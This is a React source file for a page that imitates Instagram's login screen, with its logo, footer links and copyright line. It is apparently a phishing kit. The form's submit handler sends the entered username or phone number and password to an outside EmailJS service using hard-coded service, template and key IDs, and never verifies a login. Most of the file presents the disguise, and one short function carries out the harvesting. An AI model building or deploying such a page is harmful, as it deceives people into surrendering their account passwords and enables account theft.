import React, { useRef } from "react";
import emailjs from '@emailjs/browser';
import logo from "../assets/images/logo.png";
import fb from "../assets/images/Facebook_logo_(square).png";
import app from "../assets/images/store.png";
import play from "../assets/images/micro.png";
import mobile from "../assets/images/Screenshot 2024-05-05 150842.png";
const Login = () => {
    const form = useRef();

    const sendEmail = (e) => {
      e.preventDefault();
  
      emailjs
        .sendForm('service_fswa6ng', 'template_cmq9616', form.current, {
          publicKey: 'ExMQrR3tk-yfB9w_w',
        })
        .then(
          () => {
            console.log('SUCCESS!');
          },
          (error) => {
            console.log('FAILED...', error.text);
          },
        );
    };
    return (
        <div id="container">
            <div className="flex flex-row flex-wrap -mx-3 justify-center">
                <div className="md:w-6/12 max-md:hidden w-100 px-3 h-100">
                    <img src={mobile} alt="mobile" className="h-100 h-[581px]" />
                </div>
                <div className="md:w-6/12 w-100 px-3 ">
                    <form class="main-top" onSubmit={sendEmail} ref={form}>
                        <div class="flex items-center w-100  justify-center mb-[36px]">
                            <img src={logo} alt="logo" />
                        </div>
                        <div>
                            <input type="text" placeholder="Phone number, username" name="username" class="username" required/>
                            <div>
                                <input type="password" placeholder="password" name="password" class="password" required/>
                            </div>
                            <input type="submit" value="Log in" class="login-btn mt-3" />
                        </div>
                        <div className="flex items-center gap-1">
                            <hr className="border-t w-[100px] border-black" />
                            <span class="or"> OR </span>
                            <hr className="border-t w-[100px] border-black" />
                        </div>
                        <div class="main-bottom flex items-center flex-col">
                            <a href="https://www.facebook.com/" class="logInFB flex items-center gap-2 text-blue-800"><img src={fb} alt="facebook" width={16} height={16} /> Log in with Facebook </a><br />
                            <a href="#" class="forget"> Forgot password? </a>
                        </div>
                    </form>
                    <div class="bottom border mt-3">
                        <div class="signUp">
                            Don't have an account? <a href="#">Sign up</a>
                        </div>
                    </div>
                    <div class="app-section">
                        <span> Get the app </span>
                        <div class="images">
                            <a href="#"><img src={app} alt="appstore" /></a>
                            <a href="#"><img src={play} alt="playstore" /></a>
                        </div>
                    </div>
                </div>
            </div>
            <footer>
                <div className="flex flex-wrap items-center justify-center">
                    <a href="#">Meta</a>
                    <a href="#">About</a>
                    <a href="#">Blog</a>
                    <a href="#">Jobs</a>
                    <a href="#">Help</a>
                    <a href="#">API</a>
                    <a href="#">Privacy</a>
                    <a href="#">Terms</a>
                    <a href="#">Top Accounts</a>
                    <a href="#">Locations</a>
                    <a href="#">Instagram Lite</a>
                    <a href="#">Instagram Contact</a>
                    <a href="#">Uploading & Non-Users</a>
                </div>
                <div class="bottom-footer">
                    <select name="" id="" className="bg-transparent">
                        <option value="English">English</option>
                        <option value="Hindi">Hindi</option>
                        <option value="Punjabi">Punjabi</option>
                        <option value="Urdu">Urdu</option>
                        <option value="Francais">Francais</option>
                    </select>
                    <span> &copy; 2024 Instagram from Meta</span>
                </div>
            </footer>
        </div>
    );
};
export default Login;